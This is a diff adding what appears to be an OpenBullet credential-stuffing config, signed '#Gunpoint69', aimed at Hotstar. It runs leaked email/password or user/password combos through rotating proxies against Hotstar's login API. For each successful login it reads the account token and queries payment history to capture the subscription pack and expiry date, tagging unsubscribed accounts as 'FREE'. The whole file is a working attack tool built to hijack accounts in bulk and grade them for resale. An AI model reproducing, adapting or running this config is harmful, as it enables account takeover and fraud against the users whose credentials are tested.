@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "_HotStar.com",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-09T13:31:56.3260347-07:00",
+  "AdditionalInfo": "For indian Account or website",
+  "Author": "#Gunpoint69",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#✘-Gunpoint69 REQUEST POST "https://api.hotstar.com/in/aadhar/v2/web/in/user/login" 
+  CONTENT "{\"isProfileRequired\":false,\"userData\":{\"deviceId\":\"90c6a116-fad5-408e-a149-dc5d619d7a8b\",\"pId\":\"88eb526748d34ceb896e59e52928169b\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"usertype\":\"email\"},\"verification\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+#✘-Gunpoint69 KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Login Success\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "{\"description\":{\"" 
+
+#✘-Gunpoint69 PARSE "<SOURCE>" JSON "userIdentity" -> VAR "TOKEN" 
+
+#✘-Gunpoint69 REQUEST GET "https://api.hotstar.com/in/gringotts/v2/web/in/payment/history" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "userId: <TOKEN>" 
+
+#✘-Gunpoint69 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"activeSubs\":[],\"" 
+
+#✘-Gunpoint69 PARSE "<SOURCE>" LR "packTitle\":\"" "\"" -> CAP "PACK" 
+
+#✘-Gunpoint69 PARSE "<SOURCE>" LR "expiry\":\"" "T" -> CAP "Expiry" "" " ✘-Gunpoint69" 
+
